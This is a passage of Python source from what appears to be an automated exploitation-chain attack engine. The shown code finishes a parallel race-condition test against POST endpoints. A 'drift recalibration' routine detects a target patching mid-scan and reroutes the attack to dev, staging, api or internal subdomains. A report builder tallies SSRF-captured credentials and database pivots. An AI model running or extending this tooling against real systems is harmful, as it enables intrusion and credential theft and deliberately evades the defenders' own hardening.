                            "module": "chain_intelligence",
                            "phase": "chain_intel",
                            "evidence": f"accepted={accepted_count}/5, elapsed={elapsed}ms",
                        })

                        self.add_probe({
                            "probe_type": "CHAIN_RACE_CONDITION",
                            "target": self.base_url,
                            "endpoint": endpoint,
                            "method": "POST",
                            "status_code": 200,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"RACE CONDITION — {accepted_count}/5 parallel accepted",
                            "severity": "CRITICAL",
                            "description": payload["desc"],
                            "payload": json.dumps(payload["body"]),
                            "evidence": f"accepted={accepted_count}/5, elapsed={elapsed}ms",
                            "timestamp": _ts(),
                        })
                    else:
                        self.log(
                            f"[BLOCK] Race condition held: {endpoint} — "
                            f"{accepted_count}/5 accepted ({payload['desc']})",
                            "success", "chain_intel"
                        )

                except Exception:
                    pass

        race_vulns = sum(1 for r in race_results if r["vulnerable"])
        self.log(
            f"[CHAIN] Race condition phase complete — {race_vulns} vulnerable, "
            f"{len(race_results)} total tests",
            "error" if race_vulns > 0 else "success",
            "chain_intel"
        )

    async def _phase_drift_recalibration(self):
        self.log(
            "[CHAIN §6] DRIFT RECALIBRATION — Checking defense changes during chain execution...",
            "warn", "chain_intel"
        )

        drift_detected = False
        for endpoint, baseline_status in self.baselines.items():
            if baseline_status == 0:
                continue
            url = f"{self.base_url}{endpoint}"
            try:
                resp = await self.client.get(url, timeout=5)
                current_status = resp.status_code

                changed = current_status != baseline_status
                snapshot = DriftSnapshot(
                    endpoint=endpoint,
                    baseline_status=baseline_status,
                    current_status=current_status,
                    drift_detected=changed,
                    timestamp=_ts(),
                )
                self.drift_snapshots.append(snapshot)

                if changed:
                    drift_detected = True
                    direction = "HARDENED" if current_status in (403, 429, 503) else "RELAXED"

                    self.log(
                        f"[ALERT] DEFENSE DRIFT: {endpoint} changed {baseline_status}→{current_status} ({direction}) — "
                        f"{'Target is patching mid-scan!' if direction == 'HARDENED' else 'Defense weakened — new attack surface'}",
                        "error", "chain_intel"
                    )

                    if direction == "HARDENED":
                        subdomain_prefixes = ["dev", "staging", "api", "internal", "admin", "test", "beta", "v2"]
                        parsed = urlparse(self.base_url)
                        rerouted = False
                        for prefix in subdomain_prefixes[:4]:
                            alt_host = f"{prefix}.{parsed.hostname}"
                            alt_url = f"{parsed.scheme}://{alt_host}{endpoint}"
                            try:
                                alt_resp = await self.client.get(alt_url, timeout=3)
                                if alt_resp.status_code not in (403, 429, 503, 0):
                                    snapshot.recalibrated = True
                                    snapshot.new_target = alt_host
                                    rerouted = True
                                    self.log(
                                        f"[ALERT] REROUTED: {endpoint} → {alt_host} (HTTP {alt_resp.status_code})",
                                        "warn", "chain_intel"
                                    )

                                    self.chain_events.append(ChainEvent(
                                        phase=ChainPhase.DRIFT_RECALIBRATION,
                                        timestamp=_ts(),
                                        technique="drift_reroute",
                                        target=f"{alt_host}{endpoint}",
                                        success=True,
                                        evidence=f"Rerouted from {parsed.hostname} to {alt_host}",
                                    ))
                                    break
                            except Exception:
                                pass

                        if not rerouted:
                            self.log(
                                f"[BLOCK] No alternative route found for {endpoint} — endpoint hardened",
                                "warn", "chain_intel"
                            )

                    self.add_finding({
                        "title": f"Defense Drift Detected: {endpoint} ({direction})",
                        "description": (
                            f"Target defense changed during chain execution: {endpoint} status "
                            f"{baseline_status}→{current_status} ({direction}). "
                            f"{'Attack tree recalculated.' if snapshot.recalibrated else 'No alternative route available.'}"
                        ),
                        "severity": "medium" if direction == "HARDENED" else "high",
                        "category": "drift_detection",
                        "module": "chain_intelligence",
                        "phase": "chain_intel",
                    })

            except Exception:
                pass

        drift_count = sum(1 for s in self.drift_snapshots if s.drift_detected)
        recalibrated = sum(1 for s in self.drift_snapshots if s.recalibrated)
        self.log(
            f"[CHAIN] Drift analysis complete — {drift_count} endpoints changed, "
            f"{recalibrated} rerouted to alternative hosts",
            "error" if drift_detected else "success",
            "chain_intel"
        )

    def _build_report(self) -> Dict:
        ssrf_captures = len(self.captured_credentials)
        db_pivots = len(self.db_access_results)
        ecom_failures = sum(1 for r in self.ecommerce_results if r["vulnerable"])
        ecom_reflections = sum(1 for r in self.ecommerce_results if r.get("db_reflected"))
        drift_events = sum(1 for s in self.drift_snapshots if s.drift_detected)
        drift_reroutes = sum(1 for s in self.drift_snapshots if s.recalibrated)

        self.log(
            "━━━ CHAIN INTELLIGENCE SUMMARY ━━━",
            "error" if (ssrf_captures + db_pivots + ecom_failures) > 0 else "success",
            "chain_intel"
        )
        self.log(
            f"[CHAIN] Credentials captured: {ssrf_captures} | DB pivots: {db_pivots} | "
            f"E-com failures: {ecom_failures} (reflected: {ecom_reflections}) | "
            f"Drift events: {drift_events} (rerouted: {drift_reroutes})",
            "error" if ssrf_captures > 0 else "info",
            "chain_intel"
        )
        self.log(
            f"[CHAIN] Total probes: {self.total_probes} | Successful: {self.successful_probes} | "
            f"Chain events: {len(self.chain_events)}",
            "info", "chain_intel"
        )

        return {
            "engine": "exploitation_chain_intelligence",
            "version": "1.0",
            "total_probes": self.total_probes,
            "successful_probes": self.successful_probes,
            "chain_events": [
                {
                    "phase": e.phase.value,
                    "timestamp": e.timestamp,
                    "technique": e.technique,
                    "target": e.target,
                    "success": e.success,
                    "evidence": e.evidence[:200],
                    "feeds_into": e.feeds_into,
                }
                for e in self.chain_events
            ],
            "waf_probability": self.waf_reasoner.to_dict(),
            "ssrf_credential_captures": {
                k: {
                    "service": v["service"],
                    "via": f"{v['via_endpoint']}?{v['via_param']}=",
                    "pivot_type": v["pivot_type"],
                }
                for k, v in self.captured_credentials.items()
            },
            "ssrf_captures_count": ssrf_captures,
            "db_pivot_results": self.db_access_results[:20],
            "db_pivots_confirmed": db_pivots,
            "ecommerce_integrity": {
                "total_tests": len(self.ecommerce_results),
                "failures": ecom_failures,
                "db_reflections": ecom_reflections,
                "details": [r for r in self.ecommerce_results if r["vulnerable"]][:10],
            },
            "drift_monitoring": {
                "endpoints_monitored": len(self.baselines),
                "drift_events": drift_events,
                "rerouted": drift_reroutes,
                "snapshots": [
                    {
                        "endpoint": s.endpoint,
                        "baseline": s.baseline_status,
                        "current": s.current_status,
                        "drift": s.drift_detected,
                        "recalibrated": s.recalibrated,
                        "new_target": s.new_target,
                    }
                    for s in self.drift_snapshots if s.drift_detected
                ],
            },
        }
